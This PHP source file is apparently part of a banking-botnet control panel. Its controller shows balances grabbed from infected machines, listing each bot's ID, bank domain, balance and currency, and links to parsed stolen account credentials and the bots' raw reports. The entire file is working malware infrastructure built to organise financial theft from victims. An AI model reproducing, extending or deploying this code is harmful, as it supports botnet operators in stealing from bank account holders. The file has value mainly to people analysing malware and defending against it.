<?php
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/db-gui.php';
require_once 'system/lib/guiutil.php';

class reports_balgrabberController {
    function __construct(){
        $this->db = dbPDO::singleton();
//        $this->amiss = Amiss::singleton();
    }

    function actionIndex($filter = null, $sort = '', $page = null){
        ThemeBegin(LNG_MM_REPORTS_BALGRABBER, 0, getBotJsMenu('botmenu'), 0);

        echo '<div align="right"><a href="?m=ajax_config&action=balgrabber" class="ajax_colorbox" />', LNG_BALGRABBER_CONFIG, '</a></div>';

        $this->actionAjaxBlockBalanceList($filter, $sort, $page);

        echo <<<HTML
<script type="text/javascript" src="theme/js/jquery.waypoints/waypoints.min.js"></script>
<script type="text/javascript" src="theme/js/jquery.waypoints/shortcuts/infinite-scroll/waypoints-infinite.min.js"></script>

<script type="text/javascript" src="theme/js/page-reports_balgrabber.js"></script>
HTML;

        ThemeEnd();
    }

    /** BLOCK: List of analyses
     */
    function actionAjaxBlockBalanceList($filter = null, $sort = '', $page = 0){
        # Init clicksort
        $Clicksort = new Clicksort(false);
        $Clicksort->addField('dt',          '-', '`bal`.`dt`');
        $Clicksort->addField('domain',      '+', '`bal`.`domain`');
        $Clicksort->addField('botId',       '+', '`bal`.`botId`');
        $Clicksort->addField('balance',     '-', '`bal`.`balance`');
        $Clicksort->config($sort, 'dt-');
        $Clicksort->render_url('?'.mkuri(0, 'sort', 'page').'&sort=');

        # Init filter
        $Qfilt = array(
            ':botId' => null,
            ':domain' => null,
        );
        if (!empty($filter))
            foreach (array_filter(explode(',', $filter)) as $f){
                list($name,$value) = explode(':', $f) + array(1 => '');
                if (array_key_exists(":{$name}", $Qfilt))
                    $Qfilt[":{$name}"] = $value;
            }

        # Query
        $accparse_on = !file_exists('system/reports_accparse.php');

        $q = $this->db->prepare(
            'SELECT
                `bal`.*,
                '.($accparse_on? 'COUNT(`acc`.`id`)' : '0').' AS `accounts_n`,
                `bl`.`comment` AS `bot_comment`,
                `bl`.`rtime_last` >= '.ONLINE_TIME_MIN.' AS `bot_is_online`
             FROM `botnet_rep_balance` `bal`
                '.($accparse_on? 'LEFT JOIN `accparse_accounts` `acc` ON(`bal`.`botId` = `acc`.`bot_id` AND `bal`.`accparse_rule` = `acc`.`rule_id`)' : '').'
                LEFT JOIN `botnet_list` `bl` ON(`bal`.`botId` = `bl`.`bot_id`)
             WHERE
                (:botId IS NULL OR `bal`.`botId` = :botId) AND
                (:domain IS NULL OR `bal`.`domain` = :domain)
             GROUP BY `bal`.`id`
             ORDER BY
                '.$Clicksort->orderBy().'
             LIMIT :limit, :perpage
             ;');
        $q->bindValue(':limit', $page * $perpage=50, PDO::PARAM_INT);
        $q->bindValue(':perpage', $perpage, PDO::PARAM_INT);
        foreach ($Qfilt as $k => $v)
            $q->bindValue($k, $v);
        $q->execute();

        # Display the results
        echo '<table class="zebra lined"><caption>', LNG_BALGRABBER_BALANCE_LIST, array_filter($Qfilt)? ' :: '.implode(' ', $Qfilt) : '', '</caption>',
            '<THEAD><tr>',
                '<th>', $Clicksort->field_render('dt', LNG_BALGRABBER_BALANCE_LIST_TH_DATE), '</th>',
                '<th>', $Clicksort->field_render('botId', LNG_BALGRABBER_BALANCE_LIST_TH_BOTID), '</th>',
                '<th>', $Clicksort->field_render('domain', LNG_BALGRABBER_BALANCE_LIST_TH_DOMAIN), '</th>',
                '<th>', $Clicksort->field_render('balance', LNG_BALGRABBER_BALANCE_LIST_TH_BALANCE), '</th>',
                '<th>', LNG_BALGRABBER_BALANCE_LIST_TH_REPORTS, '</th>',
            '</tr></THEAD>';
        echo '<TBODY class="infinite-container">';
        while ($row = $q->fetchObject()){
            $classes = array();
            if ($row->highlight)
                $classes[] = 'highlight';

            echo '<tr class="', implode(' ', $classes), '" data-id="', $row->id, '">';
            echo '<td>', $row->dt, '</td>';
            echo '<td>', botPopupMenu($row->botId, 'botmenu', $row->bot_comment, $row->bot_is_online), '</td>';
            echo '<td>',
                '<a href="?m=reports_balgrabber&filter=', urlencode("domain:{$row->domain}"), '">', $row->domain, '</a>',
                $row->accounts_n
                    ? " <b><a href='?m=reports_accparse&list=accs&bot=".urlencode($row->botId)."&rule={$row->accparse_rule}' target='_blank'>( {$row->accounts_n} accounts )</a></b>"
                    :'',
                '</td>';
            echo '<td>', number_format($row->balance, 0, '.', ' '), '&nbsp;', $row->currency, '</td>';

            $all_reps_n = substr_count($row->reps, "\n");
            $all_reps = $all_reps_n
                ? "<a href='?m=reports_balgrabber/ajaxLoadReps&id={$row->id}' class='ajax_replace'>".LNG_BALGRABBER_BALANCE_LIST_SHOW_ALL_REPORTS.": $all_reps_n</a>"
                : '';
            echo '<td><ul>',
                '<li>', report_link_brief($row->rep_login), ' — ', report_link_brief($row->rep_bl), '</li>',
                '</ul>',
                $all_reps,
                '</td>';
            echo '</tr>';
        }
        echo '</TBODY>';
        if ($q->rowCount())
            echo '<TFOOT><tr><td colspan=5>',
                '<a class="infinite-more-link" href="?m=reports_balgrabber/ajaxBlockBalanceList&', mkuri(0, 'm', 'page'), '&page=', $page+1, '">', '</a>',
                '</td></tr></TFOOT>';
        echo '</table>';
    }

    /** AJAX: Load reports list for the specified balance report
     * @param $id
     */
    function actionAjaxLoadReps($id){
        # Load
        $q = $this->db->query('SELECT `reps` FROM `botnet_rep_balance` WHERE `id`=:id', array(':id' => $id));
        $reps = $q->fetchColumn();
        if (!$reps)
            return '';

        # Preprocess them
        # This is the \n-sep list of (http-report)\n(balance-report)
        echo '<ul>';
        foreach (array_filter(array_map('trim', explode("\n", $reps))) as $i => $rep){
            if ($i%2 == 0)
                echo '<li>';
            else
                echo ' — ';
            echo report_link_brief($rep);
        }
        echo '</ul>';
    }

    /** WIDGET: Balances list for a single bot
     * @param string $botId
     * @param bool $getdata
     */
    function widget_botinfo_BalanceList($botId, $getdata = false){
        $q = $this->db->query(
            'SELECT
                `bal`.`dt`,
                `bal`.`domain`,
                `bal`.`balance`,
                `bal`.`currency`,
                `bal`.`highlight`
             FROM `botnet_rep_balance` `bal`
                CROSS JOIN (
                    SELECT MAX(`id`) AS `id`
                    FROM `botnet_rep_balance`
                    WHERE `botId`=:botId
                    GROUP BY `domain`, `currency`
                    ORDER BY NULL
                ) `_t` USING(`id`)
             ORDER BY `dt` DESC
             LIMIT 30
            ;', array(
            ':botId' => $botId
        ));
        if ($getdata)
            return $q->fetchAll(PDO::FETCH_OBJ);
        if (!$q->rowCount())
            return '<i>(no Balance Grabber info)</i>';

        $html = '';
        $html .= '<table id="widget-botinfo-BalanceList" class="zebra lined">'.
            '<caption>Balance Grabber: '.'<a href="?m=reports_balgrabber&filter='.urlencode("botId:$botId").'">'.htmlspecialchars($botId).'</a>'.'</caption>'.
            '<THEAD><tr>'.
                '<th>Date</th>'.
                '<th>Domain</th>'.
                '<th>Balance</th>'.
            '</tr></THEAD>';
        $html .= '<TBODY>';
        while ($row = $q->fetchObject()){
            $classes = array();
            if ($row->highlight)
                $classes[] = 'highlight';

            $html .= '<tr class="'.implode(' ', $classes).'">';
            $html .= '<td>'.$row->dt.'</td>';
            $html .= '<td>'.'<a href="?m=reports_balgrabber&filter='.urlencode("botId:$botId,domain:{$row->domain}").'" target="_blank">'.$row->domain.'</a>'.'</td>';
            $html .= '<td>'.$row->balance.'&nbsp;'.$row->currency.'</td>';
            $html .= '</tr>';
        }
        $html .= '</TBODY>';
        $html .= '</table>';

        return $html;
    }

    # TODO: AccParser integration
}
